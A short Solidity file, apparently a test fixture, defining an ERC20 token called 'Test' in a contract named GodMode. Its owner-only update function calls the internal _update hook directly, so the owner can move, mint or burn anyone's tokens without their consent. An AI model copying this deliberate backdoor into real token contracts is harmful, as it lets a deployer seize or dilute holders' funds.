//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract GodMode is ERC20, ERC20Permit, Ownable {
    constructor() ERC20("Test", "TST") ERC20Permit("Test") Ownable(msg.sender) {}

    function update(address from, address to, uint256 value) public onlyOwner {
        _update(from, to, value);
    }
}
